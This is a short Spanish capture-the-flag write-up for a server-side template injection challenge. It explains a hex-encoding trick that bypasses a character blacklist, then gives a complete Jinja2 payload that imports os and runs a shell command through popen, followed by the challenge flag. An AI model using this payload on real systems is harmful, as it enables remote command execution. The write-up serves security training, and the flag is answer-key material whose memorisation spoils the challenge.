## Descripcion

## Solucion
1. Entrar al link proporcionado por el reto

2. Identificar que el sistema cuenta con una lista negra (_blacklist_) que bloquea ciertos caracteres comunes en las plantillas

3. Utilizar codificación hexadecimal (como `\x5f\x5f` para los guiones bajos) para evitar las restricciones de la lista negra

4. Construir y refinar progresivamente el payload utilizando los filtros y atributos correspondientes
 
5. Ejecutar la carga útil completa `{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')() }}` para leer el archivo y obtener la flag

flag: 
academy{sst1_f1lt3r_byp4ss_d6571c77}
## Notas adicionales
## Referencias
